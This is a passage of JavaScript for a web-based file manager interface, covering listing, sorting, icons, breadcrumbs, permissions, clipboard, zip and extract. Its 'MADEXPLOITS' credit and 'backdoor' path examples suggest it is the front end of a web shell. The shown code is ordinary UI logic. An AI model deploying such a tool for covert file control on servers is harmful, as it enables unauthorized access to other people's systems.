    appendBcSegment(bc, seg, acc + '/', i === 1);
  });
}

function sortEntries(arr){
  const col = S.sortCol, dir = S.sortDir==='desc' ? -1 : 1;
  return arr.slice().sort((a,b)=>{
    if(a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
    let v;
    if(col==='size'){
      const sa = a.is_dir ? -1 : (a.size||0);
      const sb = b.is_dir ? -1 : (b.size||0);
      v = sa - sb;
    } else if(col==='modified'){
      v = (a.modified||0) - (b.modified||0);
    } else if(col==='perm'){
      v = String(a.perm||'').localeCompare(String(b.perm||''));
    } else {
      v = a.name.localeCompare(b.name, undefined, {numeric:true, sensitivity:'base'});
    }
    return v * dir;
  });
}

function setSort(col){
  if(S.sortCol === col) S.sortDir = S.sortDir==='asc' ? 'desc' : 'asc';
  else { S.sortCol = col; S.sortDir = 'asc' }
  renderList();
}

const $ = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];

// --- HELPER  BY MADEXPLOITS ---

function normalizePath(path) {
    if (!path) return '';
    if (path === '/') return '/';
    // Replace multiple slashes with single slash and remove trailing slash
    return path.replace(/\/+/g, '/').replace(/\/$/, '');
}

// ─── Icons ───────────────────────────────────────────────────────
// ─── Icon Set — Lucide-inspired, type-distinctive ────────────────
// Common file body path (used by document-style icons)
const _F_BODY = '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>';
const _F_FOLD = '<path d="M14 2v6h6z" fill-opacity=".35"/>';

const IC = {
  // Folder — solid with tab
  folder: `<svg class="fico" viewBox="0 0 24 24" fill="currentColor"><path d="M3 5a2 2 0 0 1 2-2h4.17a2 2 0 0 1 1.41.59L12 5h7a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>`,

  // Generic file — body + folded corner
  file:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">${_F_BODY}${_F_FOLD}</svg>`,

  // PHP — file + chevron + question stem emblem
  php:     `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 12.5l-2.5 2.5L9 17.5"/>
      <path d="M13.5 12.5c.83 0 1.5.67 1.5 1.5 0 1-1.5 1.4-1.5 2.3"/>
      <path d="M13.5 18h.01"/>
    </g>
  </svg>`,

  // JS — file + "JS" letterforms (J hook + S curve)
  js:      `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M10 12.5v3.5a1.5 1.5 0 0 1-3 0"/>
      <path d="M17 13.5a1.5 1.5 0 0 0-3 0c0 1.5 3 1.2 3 2.5a1.5 1.5 0 0 1-3 0"/>
    </g>
  </svg>`,

  // CSS — file + "#" hash
  css:     `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
      <path d="M10 12l-1.5 6"/><path d="M14 12l-1.5 6"/>
      <path d="M7 14h10"/><path d="M6.5 16h10"/>
    </g>
  </svg>`,

  // HTML — file + "</>" chevrons
  html:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".25"/>
    <path d="M14 2v6h6z" opacity=".55"/>
    <g fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 13l-2.5 2L9 17"/>
      <path d="M15 13l2.5 2L15 17"/>
      <path d="M13 12.5l-2 5"/>
    </g>
  </svg>`,

  // Config — gear/settings (Lucide-style)
  config:  `<svg class="fico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
    <path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/>
    <circle cx="12" cy="12" r="3"/>
  </svg>`,

  // Text — file + horizontal lines
  text:    `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" opacity=".4"/>
    <path d="M14 2v6h6z" opacity=".6"/>
    <g fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
      <path d="M8 13h8"/><path d="M8 16h8"/><path d="M8 19h5"/>
    </g>
  </svg>`,

  // Image — picture with sun and mountain
  image:   `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <rect x="3" y="3" width="18" height="18" rx="2"/>
    <circle cx="8.5" cy="8.5" r="1.7" fill="rgba(0,0,0,.4)"/>
    <path d="M21 15l-3.86-3.86a2 2 0 0 0-2.83 0L8 17.31l-2.17-2.17a2 2 0 0 0-2.83 0L3 15.31V20a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1z" fill="rgba(0,0,0,.4)"/>
  </svg>`,

  // Archive — package box with tape
  archive: `<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <path d="M2 4a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1z" opacity=".7"/>
    <path d="M3 8v12a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V8z"/>
    <path d="M10 13h4v3h-4z" fill="rgba(0,0,0,.4)"/>
  </svg>`,

  // Database — stacked cylinders
  database:`<svg class="fico" viewBox="0 0 24 24" fill="currentColor">
    <ellipse cx="12" cy="5" rx="9" ry="3"/>
    <path d="M3 5v6c0 1.66 4.03 3 9 3s9-1.34 9-3V5" opacity=".7"/>
    <path d="M3 11v6c0 1.66 4.03 3 9 3s9-1.34 9-3v-6" opacity=".5"/>
  </svg>`,
};
const ico = t => `<span class="ico-wrap">${IC[t]||IC.file}</span>`;

// ─── Utils ───────────────────────────────────────────────────────
const esc = s => { const d=document.createElement('div'); d.textContent=s; return d.innerHTML };
const fmtBytes = b => {
  if(b==null)return'—';if(b<1024)return b+' B';
  const u=['KB','MB','GB'];let v=b/1024;
  for(const x of u){if(v<1024)return(v>=100?v.toFixed(0):v.toFixed(1))+' '+x;v/=1024}
  return v.toFixed(1)+' TB';
};
const fmtDate = ts => new Date(ts*1000).toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'2-digit',minute:'2-digit'});
const fmtRelTime = ts => {
  if(!ts) return '—';
  const now = Date.now()/1000;
  const diff = now - ts;
  if(diff < 5) return 'just now';
  if(diff < 60) return Math.floor(diff)+'s ago';
  if(diff < 3600) return Math.floor(diff/60)+'m ago';
  if(diff < 86400) return Math.floor(diff/3600)+'h ago';
  if(diff < 172800) return 'Yesterday';
  if(diff < 604800) return Math.floor(diff/86400)+'d ago';
  const d = new Date(ts*1000);
  const m = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  if(diff < 31536000) return m[d.getMonth()]+' '+d.getDate();
  return m[d.getMonth()]+' '+d.getDate()+' \''+String(d.getFullYear()).slice(-2);
};
const getExt = name => {
  if(!name) return '';
  const i = name.lastIndexOf('.');
  return (i>0 && i<name.length-1) ? name.substring(i+1).toUpperCase() : '';
};

function permClass(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  const owner = +s[0], world = +s[2];
  let cls;
  if(owner & 2){
    cls = (owner & 1) ? 'perm-ok-x' : 'perm-ok';
  } else {
    cls = 'perm-locked';
  }
  return cls;
}
function permSymbolic(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  let r = '';
  for(const d of s){
    const n = +d;
    r += (n&4?'r':'-') + (n&2?'w':'-') + (n&1?'x':'-');
  }
  return r;
}
function permLabel(perm){
  if(!perm) return '';
  const s = String(perm).slice(-3);
  if(s.length !== 3 || !/^\d{3}$/.test(s)) return '';
  const owner = +s[0], world = +s[2];
  const writable = !!(owner & 2);
  const exec = !!(owner & 1);
  const pub = !!(world & 2);
  let lbl = writable ? (exec ? 'Writable + executable' : 'Writable') : 'Read-only · locked';
  if(pub) lbl += ' · world-writable';
  return lbl;
}
const joinPath = (a,b) => {
  if(!a) return b;
  if(!b) return a;
  // Handle Windows drive paths
  if(a.match(/^[A-Za-z]:[\/\\]?$/)) {
    return a + '/' + b;
  }
  return a + '/' + b;
};
const itemPath = n => {
    if (!n) return S.path;
    
    // Handle absolute Linux path
    if (S.path && S.path.startsWith('/')) {
        let base = S.path;
        // Ensure base ends with slash for joining
        if (!base.endsWith('/')) {
            base = base + '/';
        }
        let joined = base + n;
        // Clean up double slashes
        return joined.replace(/\/+/g, '/');
    }
    
    return joinPath(S.path, n);
};

// ─── API ─────────────────────────────────────────────────────────
async function api(action,data={},isForm=false){
  const opts={method:'POST'};
  if(isForm){opts.body=data}else{opts.headers={'Content-Type':'application/json'};opts.body=JSON.stringify({action,...data});}
  let r;
  try{
    r=await fetch(API,opts);
  }catch(e){
    return {ok:false,error:'Network failed: '+(e&&e.message?e.message:'fetch error')};
  }
  if(r.status===401){
    location.reload();
    return {ok:false,error:'Unauthorized',auth_required:true};
  }
  const text=await r.text();
  let dataJson=null;
  try{
    dataJson=text?JSON.parse(text):null;
  }catch(e){
    const snippet=(text||'').replace(/\s+/g,' ').slice(0,180);
    return {ok:false,error:'Invalid JSON (HTTP '+r.status+')'+(snippet?': '+snippet:'')};
  }
  if(!dataJson || typeof dataJson!=='object'){
    return {ok:false,error:'Empty response (HTTP '+r.status+')'};
  }
  return dataJson;
}

// ─── Toast ───────────────────────────────────────────────────────
function toast(msg,type='ok'){
  const el=document.createElement('div');
  el.className='toast '+(type==='error'?'err':'ok');
  el.innerHTML=`<div class="t-dot"></div>${esc(msg)}`;
  $('#toasts').appendChild(el);
  setTimeout(()=>{
    el.style.transition='opacity .25s, transform .25s';
    el.style.opacity='0'; el.style.transform='translateX(20px)';
    setTimeout(()=>el.remove(),260);
  },3000);
}

// ─── Modal ───────────────────────────────────────────────────────
const openM  = id => $(id).classList.add('open');
const closeM = id => $(id).classList.remove('open');
const closeAll = () => $$('.overlay.open').forEach(m=>m.classList.remove('open'));
$$('.mc').forEach(b=>b.addEventListener('click',closeAll));
$$('.overlay').forEach(o=>o.addEventListener('click',e=>{if(e.target===o)closeAll()}));

// ─── Breadcrumb ──────────────────────────────────────────────────
// Mengubah path apa pun (kosong, relatif, atau absolute) menjadi
// path absolute lengkap untuk ditampilkan di breadcrumb. Contoh:
//   ''                  -> 'C:/laragon/www/backdoor'
//   'subfolder'         -> 'C:/laragon/www/backdoor/subfolder'
//   'C:/Windows'        -> 'C:/Windows'
//   '/var/www'          -> '/var/www'
function toAbsolutePath(path){
    const baseNormalized = BASE.replace(/\\/g, '/').replace(/\/+$/, '');
    if (!path) return baseNormalized;
    const isWin = /^[A-Za-z]:/.test(path);
    const isLin = path.startsWith('/');
    if (isWin || isLin) return path;
    // Path relatif → gabungkan dengan BASE
    return baseNormalized + '/' + path.replace(/^\/+/, '');
}

function renderBreadcrumb(){
    const bc = $('#breadcrumb');
    bc.innerHTML = '';

    // Selalu render breadcrumb sebagai path absolute lengkap
    let currentPath = toAbsolutePath(S.path || '');

    // ── Windows absolute path (C:/laragon/www/backdoor) ──────────
    if (/^[A-Za-z]:/.test(currentPath)) {
        currentPath = currentPath.replace(/\\/g, '/');
        if (!/^[A-Za-z]:\//.test(currentPath)) {
            currentPath = currentPath.charAt(0) + ':/' + currentPath.substring(2);
        }

        const drive = currentPath.charAt(0) + ':';
        let pathAfterDrive = currentPath.substring(2).replace(/^\/+/, '').replace(/\/+$/, '');
        const segments = pathAfterDrive ? pathAfterDrive.split('/').filter(p => p !== '') : [];

        // Tombol drive (C:)
        const driveBtn = document.createElement('button');
        driveBtn.className = 'bc-btn' + (segments.length === 0 ? ' bc-cur' : '');
        driveBtn.textContent = drive;
        driveBtn.title = drive + '/';
        driveBtn.onclick = () => navigate(drive + '/');
        bc.appendChild(driveBtn);

        renderBcSegments(bc, segments, drive, true);
    }
    // ── Linux absolute path (/var/www/html) ──────────────────────
    else if (currentPath.startsWith('/')) {
        let cleanPath = currentPath;
        if (cleanPath !== '/' && cleanPath.endsWith('/')) cleanPath = cleanPath.slice(0, -1);
        const segments = cleanPath.split('/').filter(s => s !== '');

        const rootBtn = document.createElement('button');
        rootBtn.className = 'bc-btn' + (segments.length === 0 ? ' bc-cur' : '');
        rootBtn.textContent = '/';
        rootBtn.title = '/';
        rootBtn.onclick = () => navigate('/');
        bc.appendChild(rootBtn);

        renderBcSegments(bc, segments, '', false);
    }

    // ── Up button visibility ─────────────────────────────────────
    let showUp = false;
    if (/^[A-Za-z]:/.test(currentPath)) {
        const afterDrive = currentPath.substring(2).replace(/^\/+/, '').replace(/\/+$/, '');
        showUp = afterDrive !== '';
    } else if (currentPath.startsWith('/')) {
        showUp = currentPath.replace(/\/+$/, '') !== '';
    }
    $('#btnUp').style.visibility = showUp ? 'visible' : 'hidden';
}

// Helper function to escape HTML
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ─── Render ──────────────────────────────────────────────────────
const SORT_ARROW = '<svg class="th-arrow" viewBox="0 0 12 12"><path d="M6 9 2 4h8z"/></svg>';
function thSort(col, label){
  const active = S.sortCol === col;
  return `<span class="th-sort${active?' active':''}${active && S.sortDir==='desc'?' desc':''}" data-sort="${col}">${label}${SORT_ARROW}</span>`;
}

function renderList(){
  const panel=$('#panel');
  if(!S.entries.length){
    panel.innerHTML=`<div class="empty"><div class="empty-ico"><svg viewBox="0 0 24 24"><path d="M3 5a2 2 0 0 1 2-2h4.17a2 2 0 0 1 1.41.59L12 5h7a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="currentColor"/></svg></div><h3>Empty folder</h3><p>Drop files here or create something new</p><div class="empty-actions"><button class="btn btn-primary" onclick="showCreate('file')">New File</button><button class="btn btn-ghost" onclick="showCreate('folder')">New Folder</button><button class="btn btn-ghost" onclick="openM('#mUpload')">Upload</button></div></div>`;
    updateBulkBar();
    return;
  }
  const sorted = sortEntries(S.entries);
  if(S.view==='grid'){
    panel.innerHTML='<div class="grid-wrap">'+sorted.map((e,i)=>{
      const p=itemPath(e.name);
      const ext = !e.is_dir ? getExt(e.name) : '';
      const selCls = S.selected.has(p) ? ' sel' : '';
      const { badges, recentCls, isImg } = fileMetaExtras(e);
      const thumb = isImg ? `<img class="gthumb" src="?view=${encodeURIComponent(p)}" alt="" loading="lazy">` : '';
      const thumbCls = isImg ? ' has-thumb' : '';
      return `<div class="gcard${selCls}${thumbCls}${recentCls}" style="--i:${i}" data-icon="${e.icon}" data-path="${esc(p)}" data-dir="${e.is_dir}" data-name="${esc(e.name)}" data-ed="${e.editable}" data-perm="${e.perm||''}" data-idx="${i}">
        ${thumb}${ico(e.icon)}<div class="gname">${esc(e.name)}${badges}</div><div class="gsize">${e.is_dir?'Folder':fmtBytes(e.size)}${ext?` <span class="gext">${ext}</span>`:''}</div></div>`;
    }).join('')+'</div>';
    bindGridEvents();
    updateBulkBar();
    return;
  }

  const allSelected = sorted.length>0 && sorted.every(e => S.selected.has(itemPath(e.name)));
  const headChk = `<div class="chk-cell"><div class="chk-box${allSelected?' on':''}" id="chkAll" title="Select all"></div></div>`;
  const head = `<div class="tbl-head">
${headChk}
${thSort('name','Name')}
${thSort('size','Size')}
${thSort('perm','Perm')}
${thSort('modified','Modified')}
<span style="text-align:right;padding-right:4px">Actions</span>
</div>`;

  panel.innerHTML = head + `<ul class="flist">`+sorted.map((e,i)=>{
    const p=itemPath(e.name);
    const ext = !e.is_dir ? getExt(e.name) : '';
    const chip = ext ? `<span class="fname-chip">${ext}</span>` : '';
    const selCls = S.selected.has(p) ? ' sel' : '';
    const chkCls = S.selected.has(p) ? ' on' : '';
    const dateAbs = fmtDate(e.modified);
    const dateRel = fmtRelTime(e.modified);
    const { badges, recentCls } = fileMetaExtras(e);
    return `<li class="frow${selCls}${recentCls}" style="--i:${i}" data-icon="${e.icon}" data-path="${esc(p)}" data-dir="${e.is_dir}" data-name="${esc(e.name)}" data-ed="${e.editable}" data-perm="${e.perm||''}" data-idx="${i}">
<div class="chk-cell"><div class="chk-box${chkCls}" data-path="${esc(p)}"></div></div>
<div class="fname-cell"><div class="ico-wrap">${IC[e.icon]||IC.file}</div><div class="fname-text"><span class="fname">${esc(e.name)}</span>${chip}${badges}</div></div>
<span class="fmeta">${e.is_dir?'—':fmtBytes(e.size)}</span>
<span class="fmeta"><span class="perm ${permClass(e.perm)}" data-a="chmod" title="${e.perm||'—'}${permSymbolic(e.perm)?' · '+permSymbolic(e.perm):''}${permLabel(e.perm)?' · '+permLabel(e.perm):''}">${e.perm||'—'}</span></span>
<span class="fmeta" title="${dateAbs}">${dateRel}</span>
<div class="row-acts">
  <button class="ico-btn" data-a="open" title="Open"><svg viewBox="0 0 16 16"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm9-1a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM6.5 12a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0Z" fill="currentColor"/></svg></button>
  <button class="ico-btn" data-a="rename" title="Rename"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg></button>
  <button class="ico-btn" data-a="dl" title="Download"><svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.5 3.5a.75.75 0 0 1-1.06 0l-3.5-3.5a.75.75 0 0 1 1.06-1.06l2.678 2.33Z" fill="currentColor"/></svg></button>
  <button class="ico-btn del" data-a="delete" title="Delete"><svg viewBox="0 0 16 16"><path d="M6.5 1.75a.25.25 0 0 1 .25-.25h2.5a.25.25 0 0 1 .25.25V3h-3V1.75Zm4.5 0V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15Z" fill="currentColor"/></svg></button>
</div></li>`;
  }).join('')+'</ul>';
  bindListEvents();
  bindHeaderEvents(sorted);
  updateBulkBar();
}

function bindHeaderEvents(sorted){
  $('#panel').querySelectorAll('.th-sort').forEach(s=>{
    s.onclick = ()=> setSort(s.dataset.sort);
  });
  const chkAll = $('#chkAll');
  if(chkAll){
    chkAll.onclick = e => {
      e.stopPropagation();
      const all = !chkAll.classList.contains('on');
      sorted.forEach(en => {
        const p = itemPath(en.name);
        if(all) S.selected.add(p); else S.selected.delete(p);
      });
      $('#panel').querySelectorAll('.frow').forEach(r=>{
        const on = S.selected.has(r.dataset.path);
        r.classList.toggle('sel', on);
        r.querySelector('.chk-box').classList.toggle('on', on);
      });
      chkAll.classList.toggle('on', all);
      updateBulkBar();
    };
  }
}

function setRowSelected(row, on){
  row.classList.toggle('sel', on);
  const box = row.querySelector('.chk-box');
  if(box) box.classList.toggle('on', on);
  if(on) S.selected.add(row.dataset.path);
  else   S.selected.delete(row.dataset.path);
}
function selectRange(fromIdx, toIdx, on){
  const rows = [...$('#panel').querySelectorAll('.frow')];
  const a = Math.min(fromIdx,toIdx), b = Math.max(fromIdx,toIdx);
  for(let i=a; i<=b; i++) if(rows[i]) setRowSelected(rows[i], on);
}

function bindListEvents(){
  $('#panel').querySelectorAll('.frow').forEach(row=>{
    row.querySelector('.fname-cell').onclick=ev=>{
      if(ev.metaKey || ev.ctrlKey || ev.shiftKey) return;
      openItem(row.dataset.path,row.dataset.dir==='true',row.dataset.ed==='true');
    };
    const box=row.querySelector('.chk-box');
    box.onclick=e=>{
      e.stopPropagation();
      const idx = +row.dataset.idx;
      const on = !box.classList.contains('on');
      if(e.shiftKey && S.lastClickIdx >= 0){
        selectRange(S.lastClickIdx, idx, on);
      } else {
        setRowSelected(row, on);
      }
      S.lastClickIdx = idx;
      const chkAll = $('#chkAll');
      if(chkAll){
        const rows = [...$('#panel').querySelectorAll('.frow')];
        chkAll.classList.toggle('on', rows.every(r=>r.classList.contains('sel')));
      }
      updateBulkBar();
    };
    row.oncontextmenu=e=>{e.preventDefault();showCtx(e,row.dataset.path,row.dataset.dir==='true',row.dataset.name,row.dataset.ed==='true',row.dataset.perm)};
    row.querySelectorAll('[data-a]').forEach(b=>b.onclick=e=>{e.stopPropagation();rowAct(b.dataset.a,row.dataset.path,row.dataset.dir==='true',row.dataset.name,row.dataset.ed==='true',row.dataset.perm)});
  });
}
function bindGridEvents(){
  $('#panel').querySelectorAll('.gcard').forEach(c=>{
    c.onclick=ev=>{
      if(ev.metaKey || ev.ctrlKey){
        ev.preventDefault();
        const on = !c.classList.contains('sel');
        c.classList.toggle('sel', on);
        if(on) S.selected.add(c.dataset.path);
        else   S.selected.delete(c.dataset.path);
        updateBulkBar();
        return;
      }
      openItem(c.dataset.path,c.dataset.dir==='true',c.dataset.ed==='true');
    };
    c.oncontextmenu=e=>{e.preventDefault();showCtx(e,c.dataset.path,c.dataset.dir==='true',c.dataset.name,c.dataset.ed==='true',c.dataset.perm)};
  });
}

function updateBulkBar(){
  const bar = $('#bulkBar');
  const n = S.selected.size;
  if(bar){
    if(n === 0) bar.classList.remove('show');
    else {
      bar.classList.add('show');
      const cn = $('#bulkCount'); if(cn) cn.textContent = n;
      const sum = $('#bulkSummary');
      if(sum){
        let files = 0, dirs = 0;
        S.selected.forEach(p=>{
          const en = S.entries.find(x=>itemPath(x.name)===p);
          if(en && en.is_dir) dirs++; else files++;
        });
        const parts = [];
        if(files) parts.push(files+' file'+(files!==1?'s':''));
        if(dirs) parts.push(dirs+' folder'+(dirs!==1?'s':''));
        sum.textContent = parts.join(', ');
      }
    }
  }
  const sbDel = $('#sbDelSel');
  if(sbDel){
    if(n === 0) sbDel.setAttribute('aria-disabled','true');
    else sbDel.removeAttribute('aria-disabled');
  }
}
async function bulkDownload(){
  if(!S.selected.size) return;
  for(const p of S.selected){
    const a = document.createElement('a');
    a.href = '?download=' + encodeURIComponent(p);
    a.download = '';
    document.body.appendChild(a); a.click(); a.remove();
    await new Promise(r=>setTimeout(r,300));
  }
}
function clearSelection(){
  S.selected.clear();
  $('#panel').querySelectorAll('.frow.sel, .gcard.sel').forEach(r=>{
    r.classList.remove('sel');
    const b = r.querySelector('.chk-box'); if(b) b.classList.remove('on');
  });
  const ca = $('#chkAll'); if(ca) ca.classList.remove('on');
  updateBulkBar();
}

function isZipFile(name){
  return /\.zip$/i.test(name || '');
}

function updateClipUI(){
  const btn = $('#bulkPaste');
  if(btn) btn.disabled = !(S.clipboard && S.clipboard.paths && S.clipboard.paths.length);
}

function clipCopy(paths){
  if(!paths || !paths.length) return toast('Nothing selected','error');
  S.clipboard = { mode:'copy', paths: paths.slice() };
  updateClipUI();
  toast(paths.length+' item(s) copied — navigate & paste','ok');
}

function clipCut(paths){
  if(!paths || !paths.length) return toast('Nothing selected','error');
  S.clipboard = { mode:'cut', paths: paths.slice() };
  updateClipUI();
  toast(paths.length+' item(s) cut','ok');
}

async function clipPaste(destPath){
  if(!S.clipboard || !S.clipboard.paths.length) return toast('Clipboard empty','error');
  const dest = destPath != null && destPath !== '' ? destPath : S.path;
  const action = S.clipboard.mode === 'cut' ? 'move' : 'copy';
  const d = await api(action, { paths: S.clipboard.paths, dest });
  if(!d.ok) return toast(d.error || (d.failed && d.failed[0] && d.failed[0].error) || 'Failed','error');
  if(action === 'move' && S.clipboard && d.moved && d.moved.length) {
    const movedSet = new Set(d.moved.map(m => m.from));
    S.clipboard.paths = S.clipboard.paths.filter(p => !movedSet.has(p));
    if(!S.clipboard.paths.length) S.clipboard = null;
  }
  updateClipUI();
  const failNote = d.failed && d.failed.length ? ' · '+d.failed.length+' failed' : '';
  toast((d.count||0)+' item(s) '+(action==='move'?'moved':'copied')+failNote, d.failed&&d.failed.length?'error':'ok');
  navigate(dest);
}

function showTransferModal(mode, paths){
  if(!paths || !paths.length) return toast('Nothing selected','error');
  S.transferMode = mode;
  S.transferPaths = paths.slice();
  const isMove = mode === 'move';
  $('#transferTitle').textContent = isMove ? 'Move to folder' : 'Copy to folder';
  $('#transferMsg').textContent = S.transferPaths.length+' item(s) will be '+(isMove?'moved':'copied')+' to:';
  $('#transferDest').value = toAbsolutePath(S.path || '');
  $('#transferOk').textContent = isMove ? 'Move' : 'Copy';
  openM('#mTransfer');
  setTimeout(()=>{ const el=$('#transferDest'); if(el){ el.focus(); el.select(); } }, 120);
}

async function executeTransfer(){
  const dest = $('#transferDest').value.trim();
  if(!dest) return toast('Enter destination folder','error');
  const action = S.transferMode === 'move' ? 'move' : 'copy';
  const d = await api(action, { paths: S.transferPaths, dest });
  if(!d.ok) return toast(d.error || (d.failed && d.failed[0] && d.failed[0].error) || 'Failed','error');
  closeAll();
  if(S.transferMode === 'move' && S.clipboard){
    S.clipboard = null;
    updateClipUI();
  }
  const failNote = d.failed && d.failed.length ? ' · '+d.failed.length+' failed' : '';
  toast((d.count||0)+' item(s) '+(action==='move'?'moved':'copied')+failNote, d.failed&&d.failed.length?'error':'ok');
  navigate(dest);
}

function defaultZipName(paths){
  if(paths.length === 1){
    const n = paths[0].split(/[\/\\]/).pop() || 'archive';
    const base = n.replace(/\.[^.]+$/, '');
    return base + '.zip';
  }
  const d = new Date();
  const pad = x => String(x).padStart(2,'0');
  return 'archive-'+d.getFullYear()+pad(d.getMonth()+1)+pad(d.getDate())+'-'+pad(d.getHours())+pad(d.getMinutes())+'.zip';
}

function showZipModal(paths){
  if(!paths || !paths.length) return toast('Nothing selected','error');
  S.transferPaths = paths.slice();
  $('#zipMsg').textContent = 'Compress '+paths.length+' item(s) into a ZIP archive.';
  $('#zipName').value = defaultZipName(paths);
  $('#zipDest').value = toAbsolutePath(S.path || '');
  openM('#mZip');
  setTimeout(()=>{ const el=$('#zipName'); if(el){ el.focus(); el.select(); } }, 120);
}

async function executeZip(){
  let name = ($('#zipName').value || '').trim();
  if(name && !/\.zip$/i.test(name)) name += '.zip';
  const dest = ($('#zipDest').value || '').trim() || S.path;
  const d = await api('zip', { paths: S.transferPaths, dest, name });
  if(!d.ok) return toast(d.error || 'Zip failed','error');
  closeAll();
  const failNote = d.failed && d.failed.length ? ' · '+d.failed.length+' skipped' : '';
  toast('Created '+d.zip+failNote,'ok');
  navigate(dest);
}

async function extractZip(path) {
  const name = path.split(/[\/\\]/).pop();
  
  // 1. Tambahkan await jika toAbsolutePath mengambil data secara async
  const absolutePath = await toAbsolutePath(S.path || ''); 
  
  if (!confirm('Extract "' + name + '" to current folder?\n\n' + absolutePath)) return;
  
  // 2. Memastikan api unzip ditunggu prosesnya
  const d = await api('unzip', { path, dest: S.path });
  
  if (!d.ok) return toast(d.error || 'Extract failed', 'error');
  
  toast('Extracted ' + (d.count || 0) + ' entries', 'ok');
  
  // 3. Tambahkan await jika navigate memuat ulang halaman/data secara async
  await navigate(S.path); 
}

const IMG_EXT = ['png','jpg','jpeg','gif','webp','svg','ico','bmp','avif'];
function isImageFile(name){
  const ext = (name.split('.').pop() || '').toLowerCase();
